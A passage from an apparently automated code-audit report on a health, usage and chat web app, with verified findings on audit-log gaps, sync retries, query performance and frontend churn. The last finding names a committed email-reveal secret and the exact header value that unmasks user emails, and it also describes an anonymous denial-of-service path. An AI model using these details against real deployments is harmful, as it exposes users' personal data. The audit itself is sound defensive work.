As a result none of those state-changing, PII/health-adjacent actions are ever recorded in RequestLog, so the admin Activity feed has a blind spot precisely for the health-data connection lifecycle. An account connecting/disconnecting a wearable or forcing a backfill leaves no entry in the action log — an audit-trail gap for a health-data feature.

Independent verifier — confirmation
RequestLoggingMiddleware.cs:25 `"/api/health", ...` in Excluded[]; ShouldLog (line 96): `if (req.Path.StartsWithSegments(ex)) return false;`. Collides with HealthEndpoints.cs:71 `var g = app.MapGroup("/api/health")` exposing POST /connect (99), DELETE /disconnect (122), PATCH /settings (133), POST /sync-now (159). The intended probe is a separate route: ApiEndpoints.cs:18 `api.MapGet("/health", () => Results.Ok(new { status = "ok" })).AllowAnonymous();`

Confirmed. The Excluded entry "/api/health" is matched with StartsWithSegments, whose segment-boundary semantics also match every child of the wearable Health-Sync group mapped at /api/health (HealthEndpoints.cs:71): /connect (OAuth code exchange establishing access to a user's Fitbit health data), /disconnect, /settings, /sync-now. The exclusion's stated intent (comment line 19: "probes") targets the anonymous liveness probe, which is actually a distinct route (ApiEndpoints.cs:18, full path /api/health). No compensating audit log covers these paths (grep found none), so these state-changing, health-data-lifecycle actions leave no RequestLog entry — a genuine audit-trail blind spot for a health feature. Severity Medium is correct: it is an audit-completeness gap, not a direct breach; the endpoints remain permission-gated (HealthSync) and owner-scoped. Line corrected to 25 (the exact array line holding "/api/health"); the finding's 23-28 range for the whole block is also accurate.

Remediation (approach)

Distinguish the liveness probe path from the wearable group: exclude only the exact liveness path (e.g. an exact-match check for /api/health rather than a segment-prefix that swallows /api/health/*), or rename/relocate the liveness endpoint (e.g. /api/livez) so the wearable /api/health/* actions are logged. Keep the request LINE (method/path/status) for these actions even if their bodies are dropped for privacy, mirroring the BodyExcluded pattern already used for other-user-email paths.

Medium Observability & Operations Observability & ops readiness CONFIRMED conf: high 1 verifier

Health sync stamps LastSyncUtc on a fully-failed pull, delaying recovery by the full 6h cadence instead of retrying next tick

src/Api/Services/Health/HealthSyncScheduler.cs:156-161 Graceful degradation when external services fail
Evidence
var pull = await provider.PullDayAsync(conn, day, tz, ct);
            if (!pull.Ok)
            {
                // Back off: stop the window, keep the cursor where it is (we'll resume here next tick).
                status = pull.ToSyncStatus();
                ...
                break;
            }
            ...
        await db.HealthConnections.Where(c => c.Id == conn.Id)
            .ExecuteUpdateAsync(s => s
                .SetProperty(c => c.LastSyncUtc, utcNow)
                .SetProperty(c => c.LastSyncStatus, status), ct);
Why it matters (enterprise impact)

The candidate scan (line 82-83) only re-selects a connection when LastSyncUtc == null || LastSyncUtc < utc - SyncCadence (6 hours). SyncConnectionAsync unconditionally stamps LastSyncUtc = utcNow at the end (line 156-159) even when the FIRST day's pull failed and anyOk is false (e.g. HealthPullStatus.RateLimited or transient Error). The comment claims a back-off that 'we'll resume next tick', but stamping LastSyncUtc forces the connection out of the due set for a full 6 hours. So a momentary Fitbit rate-limit or 5xx does not recover on the next 15-minute tick as the design intends — it silently defers the user's health data by up to 6 hours, and the RateLimited status the code deliberately captured to 'retry next tick' never gets that chance.

Independent verifier — confirmation
HealthSyncScheduler.cs:142-159 — `if (!pull.Ok) { status = pull.ToSyncStatus(); ... break; }` then unconditionally `await db.HealthConnections.Where(c => c.Id == conn.Id).ExecuteUpdateAsync(s => s.SetProperty(c => c.LastSyncUtc, utcNow).SetProperty(c => c.LastSyncStatus, status), ct);` — reached even when anyOk==false. Candidate gate (line 83): `c.LastSyncUtc == null || c.LastSyncUtc < dueBefore` where dueBefore = utc - SyncCadence(6h).

Confirmed. On a fully-failed pull (first day fails → break with anyOk=false), LastSyncUtc is stamped to utcNow unconditionally at lines 156-159. The per-connection due gate (line 83) then excludes the connection until LastSyncUtc < utc-6h, so a transient RateLimited/Error does NOT recover on the next 15-min tick. This directly contradicts the class doc invariant (line 27: 'RateLimited records the status and retries next tick') and the loop comment (line 144: 'we'll resume here next tick'). HealthPullStatus.RateLimited and HealthSyncStatus.RateLimited exist and are captured (IHealthProvider.cs:79, HealthConnection.cs:17) precisely to distinguish transient failures, yet the 6h stamp defeats the intended fast retry. The cursor is correctly preserved for backfill (not advanced past skipped days on failure, since anyOk=false), so no data loss — only up to a 6h delay in recovery. Correctly located; the unconditional stamp begins at line 156 (finding cited 141-161, accurate). Medium severity is appropriate: graceful-degradation defect, health-data staleness only, no security/crash impact. Fix in prose: only stamp LastSyncUtc when at least one day pulled Ok (guard on anyOk), or on transient RateLimited/Error stamp status but leave LastSyncUtc unchanged (or set to a short back-off) so the next tick re-selects the connection; reserve the 6h advance for successful or auth-expired terminal states.

Remediation (approach)

Only advance LastSyncUtc when at least one day was pulled Ok (anyOk == true); on a fully-failed window, stamp LastSyncStatus for the UI but leave LastSyncUtc unchanged (or set it to a value that keeps the row due) so the next tick re-attempts. Alternatively special-case RateLimited/transient Error to a short back-off window rather than the full SyncCadence.

Medium Performance & Scalability Query performance & indexes CONFIRMED conf: medium 1 verifier

RecordsAsync sorts by CostUsd/InputTokens/OutputTokens with no supporting index

src/Api/Services/UsageQueries.cs:557-567 Missing DB indexes for hot sort columns
Evidence
q = (sort?.ToLowerInvariant(), desc) switch
{
    ("cost", true) => q.OrderByDescending(r => r.CostUsd),
    ("cost", false) => q.OrderBy(r => r.CostUsd),
    ("input", true) => q.OrderByDescending(r => r.InputTokens),
    ("input", false) => q.OrderBy(r => r.InputTokens),
    ("output", true) => q.OrderByDescending(r => r.OutputTokens),
    ("output", false) => q.OrderBy(r => r.OutputTokens),
    ("model", true) => q.OrderByDescending(r => r.Model),
Why it matters (enterprise impact)

The records grid lets users sort by cost, input, or output tokens. Only Model has an index (UsageDbContext.cs:131); CostUsd, InputTokens, and OutputTokens have none. Each such sort forces a full sort of the entire filtered UsageRecords set before pagination, on a table that grows without bound. On a large org this makes 'sort by cost desc' (a natural first click) an expensive full scan+sort every page.

Independent verifier — confirmation
UsageQueries.cs:557-562 sorts by CostUsd/InputTokens/OutputTokens: ("cost", true) => q.OrderByDescending(r => r.CostUsd) ... ("input", ...) r.InputTokens ... ("output", ...) r.OutputTokens. UsageDbContext.cs:128-137 index list: DedupKey(unique), LocalDate, {ProjectId,LocalDate}, Model, SessionId, IsSidechain, Source, MachineName, ReportedByUser — none on CostUsd, InputTokens, or OutputTokens.

Verified against both files. RecordsAsync exposes user-facing sort on CostUsd, InputTokens, OutputTokens. The UsageRecord index configuration (UsageDbContext.cs:128-137) indexes Model but none of the three numeric sort columns, so ordering by cost/input/output (with LongCountAsync + Skip/Take pagination) requires a full sort of the filtered set on an unbounded, ingest-growing table. No mitigation exists elsewhere in the flow; page size is clamped to <=500 but that only bounds output, not the sort cost. Medium severity is appropriate: a performance/scalability defect, not correctness. Line corrected to 557 (first offending sort branch). The finding also understates that TimestampUtc, the default sort at 565-566, likewise lacks a direct index, but the cited claim stands as written.

Remediation (approach)

Add indexes for the user-selectable sort columns that lack them (CostUsd, InputTokens, OutputTokens), or at minimum the most-used one (CostUsd desc). Prefer composite indexes that lead with the common range filter (LocalDate) followed by the sort column so both filter and order are index-served; confirm selectivity/benefit against representative data before adding all three, since each index also costs on the high-write ingest path.

Medium Performance & Scalability Query performance & indexes CONFIRMED conf: medium 1 verifier

Calendar/Heatmap/Stats materialize up to 2,000,000 UsageRecord rows into process memory per request

src/Api/Services/UsageQueries.cs:44-66 Unbounded in-memory materialization of large row sets
Evidence
private IQueryable<UsageRecord> FilteredCapped(UsageFilterQuery f) =>
    Filtered(f).OrderByDescending(r => r.TimestampUtc).Take(RowMaterializationCap);
...
var stamps = await FilteredCapped(f).Select(r => new { r.LocalDate, r.TimestampUtc }).ToListAsync(ct);
Why it matters (enterprise impact)

CalendarAsync (66), HeatmapAsync (111) and StatsAsync (133) each pull one in-memory row per usage record to compute sessionization/active-minutes client-side, capped at RowMaterializationCap = 2,000,000 (line 20). The cap prevents true unbounded growth, but 2M rows is itself a very large per-request allocation: a filter that spans a wide range (or omits filters) can allocate millions of tuples plus the GroupBy/Dictionary structures on a single request thread. Several concurrent callers on the /calendar, /heatmap and /stats endpoints can drive large transient heap spikes and GC pressure, and each also runs the un-indexed TimestampUtc sort (see the TimestampUtc finding) to pick the retained window.

Independent verifier — confirmation
src/Api/Services/UsageQueries.cs:43-44: private IQueryable<UsageRecord> FilteredCapped(UsageFilterQuery f) => Filtered(f).OrderByDescending(r => r.TimestampUtc).Take(RowMaterializationCap);  | line 20: private const int RowMaterializationCap = 2_000_000;  | line 66: var stamps = await FilteredCapped(f).Select(r => new { r.LocalDate, r.TimestampUtc }).ToListAsync(ct);  | line 111 (Heatmap) and line 133 (Stats) do the same FilteredCapped(...).ToListAsync

Confirmed and correctly located. FilteredCapped (43-44) applies OrderByDescending(TimestampUtc).Take(2_000_000), and CalendarAsync (66), HeatmapAsync (111), StatsAsync (133) each ToListAsync one in-memory row per usage record to compute sessionization/active-minutes client-side instead of DB-side. The 2M cap (line 20) prevents true unbounded materialization, but 2M tuples plus GroupBy/Dictionary structures is a very large single-request allocation; a wide or filter-less range under concurrent /calendar,/heatmap,/stats callers (gated only by CalendarView permission, i.e. any authenticated user) can cause large transient heap spikes and GC pressure on Postgres-backed data. Severity Medium is appropriate: the cap and permission gate partially mitigate, and legitimate org ranges normally sit far below the cap, so this is a scalability/DoS-adjacent risk rather than a guaranteed failure. The claimed line 43-66 range is accurate; anchored to line 44 (the Take call).

Remediation (approach)

Push the sessionization/active-minute computation into the database (e.g. window functions / LAG over ordered timestamps grouped by day, or a gap-and-islands SQL aggregate) so only per-day aggregates return, rather than one row per message. If a full DB rewrite is deferred, lower the cap toward a realistic ceiling and/or require a bounded date range on these endpoints so the materialized window is small; also add the TimestampUtc index so the cap's ORDER BY is index-served.

Medium Performance & Scalability Frontend performance CONFIRMED conf: high 1 verifier

No list virtualization anywhere in the app; large lists render every row into the DOM

src/Web/src/app/features/chat/chat.html:203-287 Frontend performance
Evidence
@for (g of groups(); track g.firstUtc + ':' + g.senderUserId + ':' + g.messages[0].id) {
  ...
  @for (m of g.messages; track m.id) {
    <div class="cx-msg" ...>
      ... (reactions, tools, edit textarea per message) ...
Why it matters (enterprise impact)

A repo-wide search for cdk-virtual-scroll / CdkVirtualScroll / ScrollingModule returns ZERO matches, while 240 templates use @for. The chat conversation renders EVERY loaded message (loadHistory prepends 50 more on each scroll-to-top with no upper bound - see chat-realtime.ts loadHistory/mergeById), each with nested reaction chips, a hover tool cluster, and menus. On a long-running conversation this produces thousands of DOM nodes and event listeners, causing scroll jank, high memory, and slow change-detection passes on low-end/mobile devices - exactly the surface this app ships a mobile twin for. The same unbounded pattern appears in the users audit list and family finance transaction list.

Independent verifier — confirmation
chat.html:203 `@for (g of groups(); track ...)` -> :217 `@for (m of g.messages; track m.id)` renders every message with nested reactions/tools/menus. chat-realtime.ts:491-501 loadHistory: `const merged = before == null ? mergeById(ascending, existing) : mergeById(ascending, existing); return { ...map, [channelId]: merged };` — prepends 50 more on each scroll-to-top with no cap/trim. Repo-wide grep for cdk-virtual-scroll/CdkVirtualScroll/ScrollingModule = 0 matches.

Verified by reading the cited file and chat-realtime.ts. The template unconditionally renders every loaded message (nested @for with per-message reaction chips, hover tool cluster, and mat-menus), and loadHistory grows the underlying messages array without bound via mergeById on each scroll-to-top; groups() (chat.ts:191) derives from that array. No virtual scrolling exists anywhere (0 grep matches). Angular @for track keys reduce re-render churn but do NOT cap the number of live DOM nodes/listeners, so long conversations still produce thousands of nodes — real jank/memory cost, especially on the mobile twin. Impact is limited to long-running conversations and is a perf (not correctness/security) issue, so Medium severity is correct. File, line range, and evidence are accurate.

Remediation (approach)

Introduce CDK virtual scrolling (cdk-virtual-scroll-viewport from @angular/cdk/scrolling) for the long, homogeneous lists - primarily the chat message log and any transaction/audit feed that can accumulate. Because messages are grouped and variable-height, use the autosize/dynamic-size strategy or flatten to a single item stream with a stable item height. Alternatively cap the retained in-memory message window (drop the oldest rows when prepending beyond a threshold) so the DOM and the _messages cache stay bounded during a session.

Medium Performance & Scalability Query performance & indexes CONFIRMED conf: high 2 verifiers

Anonymous /api/public/built-with invokes the row-materializing StatsAsync over the owner's (largest) lifetime dataset with no date filter and only header-based caching

src/Api/Endpoints/PublicEndpoints.cs:52 Unbounded query / client-side materialization on an anonymous endpoint
Evidence
var filter = new UsageFilterQuery(
    from: null, to: null, projectId: null, model: null, source: null, includeSidechain: null,
    machine: null, user: new[] { ownerEmail });

var summary = await q.SummaryAsync(filter, "day", ct);   // Total.TotalTokens + Total.CostUsd
var fleet = await q.FleetAsync(filter, ct);              // distinct machines = agents
var stats = await q.StatsAsync(filter, idleGapMinutes: 30, ct); // sessions + active days
Why it matters (enterprise impact)

This endpoint is AllowAnonymous (line 68) and builds a filter with from:null/to:null, so it is unbounded in time and scoped to ReportedByUser == the site owner — the busiest account. StatsAsync calls FilteredCapped (UsageQueries.cs:133) which does Filtered(f).OrderByDescending(r => r.TimestampUtc).Take(2_000_000).Select(timestamp,cost,date).ToListAsync — i.e. it pulls up to two million of the owner's rows into process memory and sorts them on an UNINDEXED column, every uncached call. The only protection is a Cache-Control response header (advisory — a CDN/browser MAY cache) plus the "share" rate limiter; there is NO server-side cache. An unauthenticated caller varying client/headers (or any request the CDN misses) forces a fresh multi-million-row materialization + unindexed sort, giving an anonymous, low-effort memory/CPU DoS vector on the marketing landing page's live counter. Prior round noted the 2M-row cap generically; the second-order risk here is that it is reachable with no auth over the largest dataset with only header caching.

Independent verifier — confirmation
PublicEndpoints.cs:46-52 var filter = new UsageFilterQuery(from: null, to: null, ... user: new[] { ownerEmail }); ... var stats = await q.StatsAsync(filter, idleGapMinutes: 30, ct);  ||  UsageQueries.cs:43-44 private IQueryable<UsageRecord> FilteredCapped(UsageFilterQuery f) => Filtered(f).OrderByDescending(r => r.TimestampUtc).Take(RowMaterializationCap);  ||  UsageQueries.cs:133-134 var rows = await FilteredCapped(f).OrderBy(r => r.TimestampUtc).Select(r => new { r.TimestampUtc, r.CostUsd, r.LocalDate }).ToListAsync(ct);  ||  PublicEndpoints.cs:66,68 http.Response.Headers.CacheControl = $"public, max-age={CacheSeconds}"; ... }).AllowAnonymous().RequireRateLimiting("share");  ||  UsageDbContext.cs indexes on UsageRecords: LocalDate, {ProjectId,LocalDate}, Model, SessionId, IsSidechain, Source, MachineName, ReportedByUser — NO index on TimestampUtc

Code facts all verified. The endpoint is AllowAnonymous (line 68) with only a Cache-Control response header (line 66) — no server-side OutputCache/IMemoryCache exists (grep confirms none). It builds a from:null/to:null filter scoped to the owner (busiest account) and calls StatsAsync (line 52), which at UsageQueries.cs:133 invokes FilteredCapped → OrderByDescending(r.TimestampUtc).Take(2_000_000).ToListAsync — materializing the owner's entire lifetime row set into memory and sorting on TimestampUtc, which is confirmed NOT indexed in UsageDbContext (only LocalDate/ReportedByUser/etc. are). So every uncached hit pulls all owner rows + does an unindexed sort + in-memory sessionization. Real, correctly located, exploitable without auth. Downgrading High→Medium because it is materially mitigated: (1) the 'share' policy is a per-IP fixed-window limiter of 60/min (Program.cs:367-369), bounding a single attacker's throughput; (2) the ReportedByUser index makes the WHERE scan cheap and the actual owner dataset is one person's usage history, realistically far below the 2M cap, so per-request cost is elevated but not a guaranteed outage; (3) SummaryAsync and FleetAsync are DB-side GroupBy aggregates — only StatsAsync materializes rows. It is a genuine unbounded-anonymous-query / origin-cache-gap defect worth fixing (add server-side output caching and/or a TimestampUtc index), but per-IP throttling keeps it out of High.

Remediation (approach)

Do not derive the badge's session/active-day figures from the row-materializing StatsAsync on an anonymous path. Either compute SessionCount/ActiveDays from a DB-side aggregate (e.g. COUNT(DISTINCT LocalDate) and a set-based sessionization) that never pulls rows into memory, or precompute the badge numbers on a timer/cache them server-side (IMemoryCache with the same ~10-minute TTL) so anonymous callers hit an in-process cached value instead of the database. At minimum add server-side caching keyed on the owner so the header cache is not the only shield.

Medium Performance & Scalability Query performance & indexes CONFIRMED conf: high 1 verifier

Self habit-stats (ComputeUserStatsAsync) issues a per-habit nested query fan-out on every habit-page load

src/Api/Endpoints/HabitEndpoints.cs:429-435 N+1 queries
Evidence
var habits = await db.Habits.AsNoTracking()
    .Where(h => h.UserEmail == email && h.Status == HabitStatus.Active)
    .ToListAsync(ct);
int best = 0, total = 0;
foreach (var h in habits)
{
    var (streak, completed) = await ComputeHabitStreakAsync(db, email, h, today, ct);
    best = Math.Max(best, streak);
    total += completed;
}
Why it matters (enterprise impact)

For each active habit the loop calls ComputeHabitStreakAsync -> ComputeFullAsync (line 385), which itself issues a HabitDays query (line 389) PLUS LoadAutoInputsAsync (line 394), and LoadAutoInputsAsync runs up to two more queries for Water/Workout habits (HydrationEntries and, for Workout, ExerciseEntries + DailyActivities). So a single caller's habit page costs 1 (habits) + N_habits x (1..3) round-trips — always, even on the non-leaderboard self path (invoked at line 271). This is the deeper per-habit amplifier behind the separately-reported leaderboard-viewall roster N+1: on the leaderboard path the cost becomes O(users x habits x 3). Each round-trip is a separate DB call with its own latency, degrading the habit dashboard as a user accumulates habits.

Independent verifier — confirmation
HabitEndpoints.cs:429-433: foreach (var h in habits) { var (streak, completed) = await ComputeHabitStreakAsync(db, email, h, today, ct); ... }  -> ComputeFullAsync (L389 db.HabitDays query) + LoadAutoInputsAsync (L458 HydrationEntries for Water; L470/L474 ExerciseEntries+DailyActivities for Workout) = 1..3 round-trips per habit, sequential/awaited.

Verified: ComputeUserStatsAsync (L425-435) loops per active habit calling ComputeHabitStreakAsync->ComputeFullAsync, which issues a HabitDays query (L389) plus LoadAutoInputsAsync (L394). LoadAutoInputsAsync runs 0 queries for None, 1 for Water (HydrationEntries L460), 2 for Workout (ExerciseEntries L470 + DailyActivities L474) — so per-habit cost is 1..3 awaited round-trips exactly as claimed. Invoked from /leaderboard (L271, AddRowAsync) for self and every sharing/viewall user (L278-281), giving O(users x habits x up-to-3). No batching, no guard, sequential awaits. Same fan-out also present in /coach (L307-311). Real, correctly located, Medium is fair. Minor correction: it fires on the leaderboard endpoint, not a standalone habit-page-load endpoint (there is no separate self-only caller); the 'habit page load' framing is slightly imprecise but the N+1 defect and location are correct.

Remediation (approach)

Batch the per-habit reads: load all active habits' HabitDays for the window in one query keyed by HabitId IN (...), and load the hydration/exercise/activity auto-inputs for the user across the whole window once, then group in memory and score each habit from the pre-loaded maps. This collapses the per-habit query fan-out (and the leaderboard's multiplicative version) to a constant handful of queries per request.

Medium Performance & Scalability Frontend performance CONFIRMED conf: high 2 verifiers

Root shell writes a signal on every pointermove/scroll/wheel, scheduling a full CheckAlways change-detection pass over the entire desktop tree

src/Web/src/app/app.ts:854-856 Change detection / event churn
Evidence
@HostListener('document:pointermove')
@HostListener('document:keydown')
@HostListener('document:wheel')
@HostListener('document:touchstart')
@HostListener('document:scroll')
onUserActivity(): void {
  this.lastActivity.set(Date.now());
}
Why it matters (enterprise impact)

The app runs ZONELESS (no zone.js dependency, no polyfills entry, no zone provider in app.config.ts), so change detection only runs when something schedules it. `lastActivity` is a signal read reactively by the `selfAway` computed, so every one of these document-level events performs a signal WRITE, which schedules a global CD pass. Because the root App (app.ts:92) and every desktop feature component + dialog use ChangeDetectionStrategy.Eager (=Default/CheckAlways, 108 files, none OnPush), that scheduled pass traverses and dirty-checks the whole mounted desktop component tree. `pointermove`/`scroll`/`wheel` fire at up to ~60-120Hz during any cursor drag or scroll, so a user simply moving the mouse drives continuous full-tree change detection on a 100+-component page — the exact cost the OnPush split was meant to avoid, re-introduced globally by one unthrottled activity stamp. There is no throttle/debounce and the value is only consumed by a ~5-minute idle threshold, so per-event granularity is unnecessary.

Independent verifier — confirmation
app.ts:848-856:
@HostListener('document:pointerdown')
@HostListener('document:pointermove')
@HostListener('document:keydown')
@HostListener('document:wheel')
@HostListener('document:touchstart')
@HostListener('document:scroll')
onUserActivity(): void {
  this.lastActivity.set(Date.now());
}
--- app.ts:92 root App is `changeDetection: ChangeDetectionStrategy.Eager` (=CheckAlways). app.ts:178 `lastActivity = signal(...)`, 186 `selfAway = computed(() => this.pwaIdle() || this.now() - this.lastActivity() >= App.IDLE_MS)`, consumed live by `onlineUsers` (391/398) rendered in the roster. Zoneless confirmed: zone.js ABSENT from node_modules, no polyfills entry in angular.json, no provideZoneless/provideZoneChangeDetection provider (Angular 22 defaults to signal-scheduled CD when zone.js absent). Major desktop pages Eager: dashboard/users/family-home/chat/calendar/bills all `ChangeDetectionStrategy.Eager`.

Defect is real and correctly located. App is genuinely zoneless (zone.js not installed, no polyfill, no zone provider), so a signal write is what schedules change detection. `lastActivity.set(Date.now())` writes a fresh timestamp on every document pointermove/scroll/wheel/keydown/touchstart/pointerdown (6 listeners; the finding's quote omits `pointerdown`), dirtying the live `selfAway`->`onlineUsers` computed and scheduling an app-wide tick. The root App (line 92) and the heavy desktop pages (dashboard, users, chat, calendar, bills, family-home) are all `Eager`/CheckAlways, so each scheduled tick dirty-checks that whole desktop subtree. No throttle/debounce, and the value is only needed at a ~5-min idle granularity, so per-event stamping is unnecessary — a real, avoidable churn defect. Two corrections downgrade it from High to Medium: (1) the claim "108 files Eager, none OnPush" is factually wrong — 184 components ARE OnPush and 108 are Eager (verified by count), so the CheckAlways cost is confined to the Eager desktop pages, not literally every component; (2) Angular coalesces signal writes into one tick per animation frame/microtask, so bursts collapse to ~per-frame ticks rather than one full pass per event, capping the worst case. It is a performance/battery concern with no correctness, security, PII, or data-integrity impact, which does not meet the High bar for this app.

Remediation (approach)

Decouple the idle stamp from change detection: throttle the stamp to at most once every few seconds (or coalesce via a coarse timer), and/or write it to a plain (non-signal) field that a periodic timer samples, rather than a reactive signal. Attach the pointermove/scroll/wheel listeners with runOutsideAngular-equivalent semantics (a plain addEventListener that does not touch a signal on the hot events, updating the reactive idle state only on a low-frequency tick). Reserving reactive writes for the low-frequency events (keydown/touchstart/visibilitychange) also suffices for idle detection.

Medium Performance & Scalability Frontend performance CONFIRMED conf: medium 1 verifier

ChatRealtime message cache grows unbounded for the whole session and is re-sorted on every read

src/Web/src/app/core/chat-realtime.ts:491-502 Memory growth / realtime cache
Evidence
async loadHistory(channelId: number, before?: number, limit = 50): Promise<number> {
  const page = await firstValueFrom(this.api.chatMessages(channelId, { before, limit }));
  const ascending = [...page].reverse();
  this._messages.update(map => {
    const existing = map[channelId] ?? [];
    const merged = before == null ? mergeById(ascending, existing) : mergeById(ascending, existing);
    return { ...map, [channelId]: merged };
  });
  return page.length;
}
Why it matters (enterprise impact)

`_messages` accumulates every message ever loaded for every channel the user visits and is only cleared on stop()/logout (chat-realtime.ts:227). Each scroll-to-top prepends another 50-message page (chat.ts onScroll -> loadHistory) with no upper bound and no eviction of off-screen/older pages or of channels the user is no longer viewing. Because there is no DOM virtualization anywhere in the app (0 uses of cdk-virtual-scroll), the rendered `groups()` list mirrors this unbounded array in the DOM. On a long-lived session (this hub is started app-wide at the shell for any chat.read user and stays connected across pages), a power user paging through active channels steadily grows both the JS heap and the live DOM node count, degrading scroll and CD cost over time. Separately, `channels` is a computed that copies and re-sorts the full channel array on every read (chat-realtime.ts:69-72), so every shell CD pass (bell/presence read it) re-sorts.

Independent verifier — confirmation
chat-realtime.ts:494-500: this._messages.update(map => { const existing = map[channelId] ?? []; const merged = before == null ? mergeById(ascending, existing) : mergeById(ascending, existing); return { ...map, [channelId]: merged }; });  // cleared only in stop() at line 227: this._messages.set({});  // chat.ts:554-562 onScroll prepends 50-msg pages via loadHistory(id, oldest) with no cap; cdk-virtual-scroll = 0 matches app-wide; channels computed re-sorts full array (chat-realtime.ts:69-72)

Verified by reading the file. `_messages` is a per-channel signal map cleared only in stop()/logout (line 227). loadHistory (491-502) merges each fetched page in with mergeById and never evicts older pages or off-view channels; onScroll (chat.ts:554-562) fires loadHistory(id, oldest) on scroll-to-top with only an 'exhausted' guard (stops when server returns 0), so a power user can page unboundedly through active channels. Grep confirms zero cdk-virtual-scroll usage app-wide, so groups() renders the full array into the DOM. The channels computed (69-72) does copy+sort on every read and is consumed by several computeds. All claims check out; this is a gradual long-session heap/DOM/CD degradation, not a crash — Medium is correct. Core defect anchor is the loadHistory accumulation at line 491.

Remediation (approach)

Cap retained history per channel (keep a sliding window of the most recent N messages, dropping the oldest when the user is scrolled to the bottom) and evict the message/typing/share caches for channels the user hasn't viewed recently. Combine with row virtualization on the message list so DOM node count stays bounded regardless of history depth. Memoize the channel sort (sort only when the underlying list or a lastMessage changes) rather than re-sorting a fresh copy on every computed read.

Medium Performance & Scalability Frontend performance CONFIRMED conf: high 1 verifier

Insights charts bind a method (scatterOption) in the template, rebuilding a fresh ECharts option every change-detection pass and forcing a full canvas re-render

src/Web/src/app/features/insights/insights.page.ts:164 Frontend performance
Evidence
<app-chart [option]="scatterOption(c)" />
...
scatterOption(c: InsightCard): EChartsOption {
  ...
  for (let i = 0; i < n; i++) {
    const x = rnd(i * 2);
    ...
    pts.push([Number((x * 100).toFixed(1)), Number((y * 100).toFixed(1))]);
  }
  ...
  return { grid: {...}, xAxis: {...}, series: [...] };
}
Why it matters (enterprise impact)

[option] is bound to a METHOD call, not a computed/signal, so Angular re-invokes scatterOption(c) on EVERY change-detection pass of this component. The method runs an N-point (up to 60) Math.sin jitter loop and returns a brand-new EChartsOption object each time. ChartComponent's option is an input.required read inside an effect() that calls this.chart.setOption(withAxonTheme(opt), true) — because the reference is new every pass, the effect re-fires and does a full notMerge=true echarts repaint. On the desktop Insights page the root shell is CheckAlways and writes a signal on every pointermove/scroll (see app.ts onUserActivity), so this whole loop + canvas repaint runs continuously (on every mouse move/scroll) for as long as a correlation card's chart is expanded — wasted CPU/GPU and battery, and jank on a phone. The identical anti-pattern exists in the mobile twin (insights-mobile/insights.page.ts:189).

Independent verifier — confirmation
insights.page.ts:164  <app-chart [option]="scatterOption(c)" />
insights.page.ts:346  for (let i = 0; i < n; i++) { const x = rnd(i * 2); ... pts.push(...) }
insights.page.ts:360  return { grid: {...}, xAxis: {...}, series: [...] };  // fresh object each call
chart.ts:230  readonly option = input.required<EChartsOption>();
chart.ts:252-257  effect(() => { const opt = this.option(); this.theme.resolved(); this.theme.scheme(); this.chart?.setOption(withAxonTheme(opt), true); });
app.ts:849-855  @HostListener('document:pointermove') ... onUserActivity(): void { this.lastActivity.set(Date.now()); }

Verified against actual code. Template binds a METHOD call [option]="scatterOption(c)" (line 164), and scatterOption (line 332) returns a brand-new EChartsOption object every invocation after running an up-to-60-point Math.sin jitter loop. ChartComponent.option is input.required read inside an effect() (chart.ts:252-257) that calls setOption(withAxonTheme(opt), true) with notMerge=true; a new object reference every change-detection pass re-fires the effect and forces a full canvas repaint. app.ts confirms document:pointermove/scroll/wheel HostListeners (lines 849-853) write lastActivity via a signal (line 855), so in the zone-based app change detection runs continuously on mouse-move/scroll — meaning the jitter loop + full echarts repaint fires on every pointermove while a correlation card's chart is expanded. Mobile twin has the identical pattern at insights-mobile/insights.page.ts:189. Real and correctly located. Impact is bounded (only when a card is expanded via @if expanded()===cardId, at most one card, <=60 points, no correctness/data effect), so Medium is the right severity — wasteful CPU/GPU and jank especially on phones, but opt-in and self-limited.

Remediation (approach)

Do not call a chart-building method from the template binding. Precompute the expanded card's scatter option once — e.g. store the expanded card id in a signal (already present as expanded()) and expose a single computed<EChartsOption | null> that derives the option only for the currently-expanded correlation, so the option object is memoized and only recomputed when the expanded card or data actually changes. Bind [option] to that computed. Apply the same change to the mobile twin. This collapses the per-CD rebuild + full repaint to a single build per expand.

Medium Security Backend auth core CONFIRMED conf: high 1 verifier

Committed default email-reveal key "Starbucks" unmasks real user emails

src/Api/appsettings.json:42-43 Admin bootstrap / PII masking default
Evidence
"Users": {
    "_comment": "Email-visibility gate: requests whose X-Email-Reveal-Key header equals EmailRevealKey see real emails on the Users page; otherwise other users' emails are masked. Overridable via env (Users__EmailRevealKey) or appsettings.Local.json.",
    "EmailRevealKey": "Starbucks"
  }
Why it matters (enterprise impact)

The email-privacy program treats other users' real emails as restricted PII that is masked everywhere except behind this reveal gate (GET /api/users, GET /api/audit). The gate secret ships as the committed, guessable word "Starbucks". The prod docker-compose (deploy/docker-compose.prod.yml) sets many env overrides but does NOT set Users__EmailRevealKey, so unless someone remembered to add it out-of-band the deployment falls back to this baked-in default. Any authenticated caller who already holds users.view/activity.view and sends X-Email-Reveal-Key: Starbucks (a value published in the public git history) unmasks every user's real email address, defeating the entire PII-masking control.

Independent verifier — confirmation
src/Api/appsettings.json:42  "EmailRevealKey": "Starbucks"  — and the gate: src/Api/Endpoints/UsersEndpoints.cs:296-302  var configured = cfg["Users:EmailRevealKey"]; ... FixedTimeEquals(UTF8(provided), UTF8(configured));  — prod compose api env (deploy/docker-compose.prod.yml lines 26-41) sets ConnectionStrings/Jwt/Cors/Google/Auth/Usda/FatSecret/WorkoutX/Gemini but NO Users__EmailRevealKey override.

Confirmed on all points. appsettings.json:42 commits the reveal-gate secret as the guessable word "Starbucks". EmailsRevealed() (UsersEndpoints.cs:294-303) compares the X-Email-Reveal-Key header directly to Users:EmailRevealKey; the constant-time compare is moot because the value is in public git history. The prod compose api environment block (docker-compose.prod.yml:26-41) sets ~9 env overrides but not Users__EmailRevealKey, so absent an out-of-band SSM/env addition, prod inherits the baked-in default. GET /api/users and GET /api/audit are gated only by RequireAnyPermission(UsersView, UsersManage) (lines 61, 103), so any caller already holding users.view can send X-Email-Reveal-Key: Starbucks and unmask every user's real email, defeating the PII-masking program. Blast radius is limited to already-privileged callers (users.view is an admin-tier permission), which keeps it Medium rather than High, but a committed guessable secret protecting a PII control is a genuine defect. Fix in prose: remove the committed default (leave it blank so no key => never reveal, per line 297), require the key to be supplied only via env/SSM in every environment, and rotate it to a high-entropy random value; optionally fail closed/log if it is unset in production.

Remediation (approach)

